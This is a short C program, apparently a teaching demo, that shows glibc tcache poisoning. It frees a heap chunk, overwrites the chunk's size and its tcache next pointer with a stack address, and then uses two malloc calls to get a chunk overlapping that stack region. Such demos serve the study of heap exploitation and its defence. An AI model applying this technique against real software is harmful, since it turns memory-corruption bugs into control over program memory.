#include <malloc.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>


typedef struct tcache_entry
{
  struct tcache_entry *next;
} tcache_entry;

size_t *chunksizep(void *mem) {
    return (size_t *)(((char *)mem) - sizeof(size_t));
}

int main(int argc, const char* argv[]) {
    size_t target[6];
    printf("This example showcases tcache poisoning by forcing malloc to " \
            "return an arbitrary chunk after the corruption of a tcache_entry\n");
    printf("Our target is a stack region at %p\n", (void *)target);
    void *mem = malloc(0x48);
    tcache_entry *victim = (tcache_entry *)mem;
    printf("Allocated victim chunk with requested size 0x48 at %p\n", mem);

    free(mem);
    printf("Freed victim chunk to put it in a tcache bin\n");
    printf("Emulating corruption of the next ptr of victim (while also " \
            "corrupting its size for good measure)\n");

    *chunksizep(mem) = 0x41414141;
    victim->next = (void *)target; 
    printf("Now we need to make to make two requests for the appropriate size " \
            "so that malloc returns a chunk overlapping our target\n");
    void *mem1 = malloc(0x48);
    void *mem2 = malloc(0x48);
    printf("The first malloc(0x48) returned %p, the second one: %p\n",  
           mem1, mem2);

    return 0;
}

